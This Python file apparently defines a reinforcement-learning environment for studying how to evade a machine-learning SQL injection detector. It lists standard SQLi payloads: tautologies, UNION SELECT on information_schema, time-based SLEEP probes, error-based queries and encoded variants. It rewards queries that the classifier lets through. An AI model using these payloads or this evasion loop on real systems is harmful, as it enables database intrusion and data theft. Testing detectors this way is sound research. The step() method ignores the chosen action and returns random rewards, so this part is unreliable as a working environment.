import numpy as np
import pandas as pd
import random
import urllib.parse  # For URL encoding
from joblib import load


# Helper function for hex encoding
def hex_encode(input_str):
    return "".join(hex(ord(c))[2:] for c in input_str)


class SQLInjectionEnv:
    def __init__(self, model, queries):
        self.model = model
        self.queries = queries
        self.state_size = 30607  # Define the state size (length of the state vector)
        self.unique_payloads = set()
        self.actions = [
            "add OR 1=1",
            "add comment --",
            "add UNION",
            "modify quotes",
            "base",
            "add UNION SELECT",
            "add time-based sleep",
            "error-based SQLi",
            "add OR 1=1 --",
            "add OR 'a'='a'",
            "add SLEEP(5)",
            "add IF(1=1, SLEEP(5), 0) --",
            "hex encode OR 1=1",
            "URL encode UNION SELECT",
            "nested subquery SELECT FROM information_schema.tables",
        ]

    def set_query(self, query):
        """Sets the user query for evaluation and resets environment state if necessary."""
        self.query = query

    def check_bypass(self, query):
        """Check if the query passes the security check"""

        prediction = self.model.predict([query])[0]
        return prediction

    def get_reward(self, query):
        """Return reward for a given query"""
        if self.check_bypass(query):
            reward = 1  # Successful bypass
        else:
            reward = -1  # Failed bypass
        reward = 1 if self.check_bypass(query) else -1
        if query not in self.unique_payloads:
            reward += 0.1  # Diversity bonus for unique payloads
            self.unique_payloads.add(query)
        return reward

    def modify_query(self, query, action):
        """Modify the query based on the selected action"""
        modifications = {
            0: query + " OR 1=1",
            1: query + " --",
            2: query + " UNION SELECT *",
            3: query.replace("'", '"'),
            4: query,
            5: query + " UNION SELECT * FROM information_schema.tables",
            6: query + " AND SLEEP(5)",
            7: query + " AND 1=CONVERT(int, (SELECT @@version))",
            8: query + " OR 1=1 --",
            9: query + " OR 'a'='a'",
            10: query + " AND SLEEP(5)",
            11: query + " AND IF(1=1, SLEEP(5), 0) --",
            12: query + " OR " + hex_encode("1=1"),
            13: query + " " + urllib.parse.quote("UNION SELECT *"),
            14: query
            + " UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub",
        }
        return modifications.get(action, query)

    def reset(self):
        """Reset the environment and return the initial state"""
        state = random.randint(
            0, len(self.queries) - 1
        )  # Randomly select a query index
        state_vector = np.zeros(
            self.state_size
        )  # Create a zero vector of the required state size
        state_vector[state] = 1  # Set the appropriate index to 1 (one-hot encoding)
        return state_vector  # Return the state as a vector

    def step(self, action):
        """Simulate the action in the environment and return the next state and reward"""
        response = np.random.choice([1, 2, 3, 4, 0, -1])  # Simulate response
        reward = 1 if response == 3 else 0
        terminated = response == 3  # If response is 3, we consider the episode as done
        debug_msg = f"Action: {action}, Response: {response}"

        # Get the next state by randomly selecting a query index
        next_state = random.randint(0, len(self.queries) - 1)
        next_state_vector = np.zeros(self.state_size)
        next_state_vector[next_state] = 1  # One-hot encoding for the next state

        return next_state_vector, reward, terminated, debug_msg
